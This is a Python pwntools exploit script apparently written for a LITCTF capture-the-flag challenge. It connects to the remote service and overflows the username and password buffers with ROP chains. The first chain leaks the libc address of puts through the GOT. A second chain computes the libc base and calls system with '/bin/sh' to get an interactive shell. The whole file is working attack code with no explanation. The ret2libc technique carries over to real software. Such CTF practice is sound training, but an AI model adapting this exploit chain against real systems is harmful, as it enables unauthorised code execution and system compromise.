from sys import platlibdir
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("litctf.org", 31779)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

main = 0x4011EA
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
"""
0x0000000000401323 : pop rdi ; ret
"""
pop_rdi = 0x0000000000401323
bss = 0x404048 + 0x800
payload = b"tinyfat"*4
payload = payload.ljust(0x40, b"\x00")
payload += p64(main)
payload = payload.ljust(0x60, b"\x00")
io.sendafter("username:\n", payload)

payload = b"d0nt_57r1ngs_m3_3b775884".ljust(0x20, b"\x00")
payload += b"LITCTF".ljust(0x20, b"\x00")
payload += p64(bss)
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
ddebug("break *0x401256\n b *0x4012b8\n continue")
io.sendafter("password:\n", payload)
leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.success("puts:-----> " + hex(leak))  #be0
# log.success("read:-----> " + hex(leak))  #a50
libc.address = leak - libc.symbols["puts"]


log.success("libc :-----> " + hex(libc.address))
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))

payload = b"a" * 0x40 + p64(system_addr)
io.sendlineafter("username:\n", payload)
payload = b"d0nt_57r1ngs_m3_3b775884".ljust(0x20, b"\x00")
payload += b"LITCTF".ljust(0x20, b"\x00")
ret = 0x4012B9
payload += p64(bss) + p64(ret)
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(system_addr)
io.sendafter("password:\n", payload)



io.interactive()
